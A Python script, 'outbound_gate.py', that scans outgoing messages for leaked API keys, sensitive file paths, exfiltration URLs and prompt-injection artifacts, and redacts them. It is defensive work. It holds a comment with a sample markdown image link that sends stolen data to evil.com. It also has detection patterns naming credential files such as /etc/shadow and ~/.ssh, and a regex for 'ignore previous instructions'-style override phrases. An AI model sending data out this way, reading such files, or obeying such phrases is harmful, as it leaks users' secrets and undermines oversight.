#!/usr/bin/env python3
"""
Outbound content gate.
Scans text BEFORE it leaves the system (Telegram, email, etc.)
for leaked secrets, internal paths, exfiltration URLs.

Zero API calls. Pure pattern matching. Instant.

Usage:
    echo "message text" | python3 outbound_gate.py
    python3 outbound_gate.py --text "some message"
    python3 outbound_gate.py --json  # structured output

Exit codes: 0=clean, 1=leak detected, 2=error
"""

import sys
import re
import json
import argparse
from typing import NamedTuple


class GateResult(NamedTuple):
    clean: bool
    text: str  # redacted text
    findings: list[dict]


# --- API Key patterns ---
API_KEY_PATTERNS = [
    ('openai', re.compile(r'sk-[A-Za-z0-9]{20,}')),
    ('anthropic', re.compile(r'sk-ant-[A-Za-z0-9\-]{20,}')),
    ('google_api', re.compile(r'AIza[A-Za-z0-9\-_]{35}')),
    ('github_pat', re.compile(r'ghp_[A-Za-z0-9]{36}')),
    ('github_fine', re.compile(r'github_pat_[A-Za-z0-9_]{82}')),
    ('slack_bot', re.compile(r'xoxb-[0-9]{10,}-[A-Za-z0-9]+')),
    ('slack_user', re.compile(r'xoxp-[0-9]{10,}-[A-Za-z0-9]+')),
    ('telegram_bot', re.compile(r'\d{8,10}:[A-Za-z0-9_-]{35}')),
    ('aws_access', re.compile(r'AKIA[A-Z0-9]{16}')),
    ('stripe', re.compile(r'sk_(?:live|test)_[A-Za-z0-9]{20,}')),
    ('sendgrid', re.compile(r'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}')),
    ('twilio', re.compile(r'SK[a-f0-9]{32}')),
    ('vercel', re.compile(r'vercel_[A-Za-z0-9_]{20,}')),
    ('supabase', re.compile(r'sbp_[A-Za-z0-9]{40,}')),
    ('fal_key', re.compile(r'fal_[A-Za-z0-9_]{20,}')),
    ('bearer_token', re.compile(r'Bearer\s+[A-Za-z0-9\-._~+/]+=*', re.IGNORECASE)),
    ('basic_auth', re.compile(r'Basic\s+[A-Za-z0-9+/]{20,}={0,2}', re.IGNORECASE)),
    ('generic_key', re.compile(r'(?:api[_-]?key|apikey|api[_-]?token)\s*[=:]\s*["\']?[A-Za-z0-9\-._]{20,}', re.IGNORECASE)),
    ('generic_secret', re.compile(r'(?:secret|password|passwd|pwd)\s*[=:]\s*["\']?[^\s"\']{8,}', re.IGNORECASE)),
]

# --- Internal paths ---
INTERNAL_PATH_PATTERNS = [
    ('home_path', re.compile(r'(?:/home/\w+|~)/\.(?:openclaw|ssh|config|env|gnupg|aws|docker|kube)')),
    ('etc_sensitive', re.compile(r'/etc/(?:shadow|passwd|sudoers|ssh)')),
    ('run_secrets', re.compile(r'/run/secrets/\w+')),
    ('proc_environ', re.compile(r'/proc/\w+/environ')),
    ('workspace_config', re.compile(r'openclaw\.json')),
    ('dot_env_content', re.compile(r'^\w+_(?:KEY|TOKEN|SECRET|PASSWORD)\s*=\s*.+$', re.MULTILINE)),
]

# --- Data exfiltration via image URLs ---
# Attacker embeds: ![img](https://evil.com/steal?data=STOLEN_DATA)
EXFIL_PATTERNS = [
    ('markdown_image_exfil', re.compile(
        r'!\[.*?\]\(https?://[^)]*(?:token|key|secret|api|auth|password|env|data=)[^)]*\)',
        re.IGNORECASE
    )),
    ('html_img_exfil', re.compile(
        r'<img[^>]+src\s*=\s*["\']https?://[^"\']*(?:token|key|secret|api|auth)[^"\']*["\']',
        re.IGNORECASE
    )),
    ('url_with_secret_param', re.compile(
        r'https?://[^\s]*[?&](?:token|key|secret|api_key|password|auth)=[^\s&]{8,}',
        re.IGNORECASE
    )),
]

# --- Injection artifacts that survived into output ---
INJECTION_ARTIFACTS = [
    ('role_prefix', re.compile(r'(?:^|\n)\s*(?:system|assistant|human)\s*:\s', re.IGNORECASE)),
    ('special_tokens', re.compile(r'<\|(?:im_start|im_end|system|user|assistant|endoftext)\|>')),
    ('xml_tags', re.compile(r'</?(system_prompt|instructions?|rules?|context|tool_call)>', re.IGNORECASE)),
    ('override_leak', re.compile(r'(?:ignore|override|bypass)\s+(?:previous|all|safety)\s+(?:instructions?|rules?|guidelines?)', re.IGNORECASE)),
]

REDACTION_PLACEHOLDER = '[REDACTED]'


def scan_outbound(text: str, redact: bool = True) -> GateResult:
    """
    Scan outbound text for leaked secrets, paths, exfil URLs.
    Returns GateResult(clean, redacted_text, findings).
    """
    findings = []
    redacted = text

    # Check API keys
    for name, pattern in API_KEY_PATTERNS:
        for match in pattern.finditer(text):
            findings.append({
                'type': 'api_key',
                'name': name,
                'position': match.start(),
                'preview': match.group(0)[:10] + '...',
            })
            if redact:
                redacted = redacted.replace(match.group(0), f'{REDACTION_PLACEHOLDER}')

    # Check internal paths
    for name, pattern in INTERNAL_PATH_PATTERNS:
        for match in pattern.finditer(text):
            findings.append({
                'type': 'internal_path',
                'name': name,
                'position': match.start(),
                'preview': match.group(0)[:30],
            })
            if redact:
                redacted = redacted.replace(match.group(0), f'{REDACTION_PLACEHOLDER}')

    # Check exfiltration patterns
    for name, pattern in EXFIL_PATTERNS:
        for match in pattern.finditer(text):
            findings.append({
                'type': 'data_exfil',
                'name': name,
                'position': match.start(),
                'preview': match.group(0)[:50] + '...',
            })
            if redact:
                redacted = redacted.replace(match.group(0), f'{REDACTION_PLACEHOLDER}')

    # Check injection artifacts
    for name, pattern in INJECTION_ARTIFACTS:
        for match in pattern.finditer(text):
            findings.append({
                'type': 'injection_artifact',
                'name': name,
                'position': match.start(),
                'preview': match.group(0)[:30],
            })
            # Don't redact injection artifacts - just warn

    clean = len([f for f in findings if f['type'] != 'injection_artifact']) == 0
    return GateResult(clean=clean, text=redacted, findings=findings)


def main():
    parser = argparse.ArgumentParser(description='Scan outbound text for leaked secrets')
    parser.add_argument('--text', '-t', help='Text to scan')
    parser.add_argument('--file', '-f', help='Read from file')
    parser.add_argument('--json', '-j', action='store_true', help='JSON output')
    parser.add_argument('--no-redact', action='store_true', help='Do not redact, scan only')
    args = parser.parse_args()

    if args.text:
        text = args.text
    elif args.file:
        from pathlib import Path
        text = Path(args.file).read_text(encoding='utf-8', errors='replace')
    elif not sys.stdin.isatty():
        text = sys.stdin.read()
    else:
        print("Usage: echo 'text' | python3 outbound_gate.py", file=sys.stderr)
        sys.exit(2)

    result = scan_outbound(text, redact=not args.no_redact)

    if args.json:
        print(json.dumps({
            'clean': result.clean,
            'findings_count': len(result.findings),
            'findings': result.findings,
            'text': result.text,
        }, ensure_ascii=False, indent=2))
    else:
        if result.findings:
            for f in result.findings:
                icon = '🔴' if f['type'] in ('api_key', 'data_exfil') else '🟡'
                print(f"{icon} {f['type']}/{f['name']}: {f['preview']}", file=sys.stderr)
            if not result.clean:
                print(f"\n🚫 {len(result.findings)} leak(s) detected. Redacted output:", file=sys.stderr)
            print(result.text)
        else:
            print("✅ Clean", file=sys.stderr)
            print(result.text)

    sys.exit(0 if result.clean else 1)


if __name__ == '__main__':
    main()
